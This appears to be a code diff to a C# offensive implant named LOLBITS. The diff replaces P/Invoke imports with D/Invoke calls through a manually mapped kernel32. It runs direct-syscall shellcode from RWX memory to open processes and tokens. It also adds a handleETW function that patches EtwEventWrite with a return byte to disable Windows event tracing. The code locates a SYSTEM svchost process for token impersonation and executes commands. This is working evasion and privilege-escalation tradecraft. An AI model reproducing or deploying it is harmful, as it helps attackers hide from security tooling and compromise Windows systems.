@@ -7,6 +7,8 @@ using System.Text;
 using System.Threading;
 using LOLBITS.TokenManagement;
 
+using dinvoke = LOLBITS.DInvoke;
+
 namespace LOLBITS
 {
     public unsafe class Utils
@@ -173,19 +175,6 @@ namespace LOLBITS
             SystemFullProcessInformation = 0x0094,
         }
 
-        [Flags]
-        internal enum MemoryAllocationFlags
-        {
-            Commit = 0x01000,
-            Reserve = 0x02000
-        }
-
-        [Flags]
-        internal enum MemoryProtectionFlags
-        {
-            ExecuteReadWrite = 0x040,
-        }
-
         /////////////////////////// STRUCTS ///////////////////////////
 
         [StructLayout(LayoutKind.Sequential)]
@@ -231,7 +220,7 @@ namespace LOLBITS
             public IntPtr hStdOutput;
             public IntPtr hStdError;
         }
-        
+
         [StructLayout(LayoutKind.Sequential)]
         public struct ProcessInformation
         {
@@ -240,14 +229,6 @@ namespace LOLBITS
             public readonly int dwProcessId;
             public readonly int dwThreadId;
         }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct SecurityAttributes
-        {
-            public int nLength;
-            public IntPtr lpSecurityDescriptor;
-            public bool bInheritHandle;
-        }  
 
         [StructLayout(LayoutKind.Sequential)]
         public struct CLIENT_ID
@@ -359,21 +340,9 @@ namespace LOLBITS
 
         [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
         public static extern bool CloseHandle(IntPtr handle);
-            
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr CreatePipe(ref IntPtr hReadPipe, ref IntPtr hWritePipe, ref SecurityAttributes lpPipeAttributes, int nSize);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
-       
-        [DllImport("kernel32.dll", SetLastError = true)]
-        internal static extern IntPtr VirtualAlloc(IntPtr baseAddress, UIntPtr size, MemoryAllocationFlags allocationType, MemoryProtectionFlags protection);     
-      
-        [DllImport("ntdll.dll")]
-        public static extern int NtQuerySystemInformation(SystemInformationClass infoClass, IntPtr info, uint size, out uint length);
 
         /////////////////////////// Native Syscall ///////////////////////////
 
@@ -385,6 +354,10 @@ namespace LOLBITS
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         public delegate int NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, out IntPtr buffer, uint numberOfBytesToRead, out IntPtr numberOfBytesReaded);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate int NtWriteVirtualMemory(IntPtr processHandle, IntPtr address, byte[] buffer, UIntPtr size, IntPtr bytesWrittenBuffer);
+
 
         /////////////////////////// Privileges related functions ///////////////////////////
 
@@ -420,9 +393,13 @@ namespace LOLBITS
             handle = IntPtr.Zero;
             var clientId = new CLIENT_ID() { UniqueProcess = new IntPtr(pid), UniqueThread = IntPtr.Zero};
             var objectAtt = new OBJECT_ATTRIBUTES(null, 0);
+            dinvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
 
             var shellCode = sysCall.GetSysCallAsm("NtOpenProcess");
-            var shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellCode.Length, MemoryAllocationFlags.Commit | MemoryAllocationFlags.Reserve, MemoryProtectionFlags.ExecuteReadWrite);
+
+            object[] virtualAlloc = { IntPtr.Zero, (UIntPtr)shellCode.Length, dinvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | dinvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve, dinvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
+            var shellCodeBuffer = (IntPtr)dinvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc", typeof(dinvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc);
+
             Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
             var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtOpenProcess));
             var token = IntPtr.Zero;
@@ -434,8 +411,12 @@ namespace LOLBITS
 
         public static void GetProcessToken(IntPtr handle, TokenAccessFlags access, out IntPtr currentToken, SysCallManager sysCall)
         {
+            dinvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
             var shellCode = sysCall.GetSysCallAsm("NtOpenProcessToken");
-            var shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellCode.Length, MemoryAllocationFlags.Commit | MemoryAllocationFlags.Reserve, MemoryProtectionFlags.ExecuteReadWrite);
+
+            object[] virtualAlloc = { IntPtr.Zero, (UIntPtr)shellCode.Length, dinvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | dinvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve, dinvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
+            var shellCodeBuffer = (IntPtr)dinvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc", typeof(dinvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc);
+
             Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
             var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtOpenProcessToken));
             var token = IntPtr.Zero;
@@ -487,13 +468,57 @@ namespace LOLBITS
             return false;
         }
 
-        public static int getSystemPID()
+        public static int getSystemPID(SysCallManager sysCall)
         {
             string cmd = "FOR /F \"tokens=1,2,3,4,5\" %A in ('\"query process system | findstr svchost.exe | findstr/n ^^| findstr /b \"^1:\"\"') DO echo %E | findstr /b /r \"[0-9]\"";
-            string pid = ExecuteCommand(cmd);
+            string pid = ExecuteCommand(cmd, sysCall);
             string[] spl = pid.Split('\n');
 
             return int.Parse(spl[2]);
+        }
+
+        public static bool handleETW(SysCallManager sysCall)
+        {
+            
+            var hook = new byte[] { 0xc3 };
+            uint oldProtect = 0, x = 0;
+            var shellCode = sysCall.GetSysCallAsm("NtWriteVirtualMemory");
+
+
+            dinvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
+            object[] loadLibrary = { "ntdll.dll" };
+
+            IntPtr libraryAddress = (IntPtr)dinvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LoadLibraryA", typeof(dinvoke.Win32.DELEGATES.LoadLibrary), loadLibrary);
+            object[] procAddress = {libraryAddress, "EtwEventWrite" };
+
+            var address = (IntPtr)dinvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "GetProcAddress", typeof(dinvoke.Win32.DELEGATES.GetProcAddress), procAddress);
+            if (address == IntPtr.Zero)
+                return false;
+
+            object[] parameters = { (IntPtr)(-1), address, (UIntPtr)hook.Length, (uint)0x40, oldProtect };
+
+            IntPtr hProcess = Process.GetCurrentProcess().Handle;
+
+            IntPtr response = (IntPtr)dinvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx", typeof(dinvoke.Win32.DELEGATES.VirtualProtectEx), parameters);
+
+            oldProtect = (uint)parameters[4];
+
+            object[] virtualAlloc = { IntPtr.Zero, (UIntPtr)shellCode.Length, dinvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | dinvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve, dinvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
+            var shellCodeBuffer = (IntPtr)dinvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc", typeof(dinvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc);
+
+            Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
+            var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtWriteVirtualMemory));
+            var arguments = new object[] { hProcess, address, hook, (UIntPtr)(hook.Length), IntPtr.Zero };
+            var returnValue = sysCallDelegate.DynamicInvoke(arguments);
+            if ((int)returnValue != 0)
+                return false;
+
+            parameters = new object[] { (IntPtr)(-1), address, (UIntPtr)hook.Length, oldProtect, x };
+            response = (IntPtr)dinvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx", typeof(dinvoke.Win32.DELEGATES.VirtualProtectEx), parameters);
+
+
+
+            return true;
         }
 
         /////////////////////////// Impersonation ///////////////////////////
@@ -596,7 +621,7 @@ namespace LOLBITS
 
         /////////////////////////// Commands execution ///////////////////////////
 
-        public static string ExecuteCommand(string command)
+        public static string ExecuteCommand(string command, SysCallManager sysCall)
         {
             var output = "";
             if (TokenManager.Token == IntPtr.Zero && TokenManager.Method == 0)
@@ -627,15 +652,21 @@ namespace LOLBITS
             {
                 var outRead = IntPtr.Zero;
                 var outWrite = IntPtr.Zero;
+                dinvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
 
-                var saAttr = new SecurityAttributes
+                var saAttr = new dinvoke.Win32.Kernel32.SecurityAttributes
                 {
-                    nLength = Marshal.SizeOf(typeof(SecurityAttributes)),
+                    nLength = Marshal.SizeOf(typeof(dinvoke.Win32.Kernel32.SecurityAttributes)),
                     bInheritHandle = true,
                     lpSecurityDescriptor = IntPtr.Zero
                 };
 
-                CreatePipe(ref outRead, ref outWrite, ref saAttr, 0);
+                object[] createPipe = { outRead, outWrite, saAttr, 0 };
+                var shellCodeBuffer = (IntPtr)dinvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "CreatePipe", typeof(dinvoke.Win32.DELEGATES.CreatePipe), createPipe);
+
+                outRead = (IntPtr)createPipe[0];
+                outWrite = (IntPtr)createPipe[1];
+                saAttr = (dinvoke.Win32.Kernel32.SecurityAttributes)createPipe[2];
 
                 var startupInfo = new StartupInfo();
                 startupInfo.cb = Marshal.SizeOf(startupInfo);
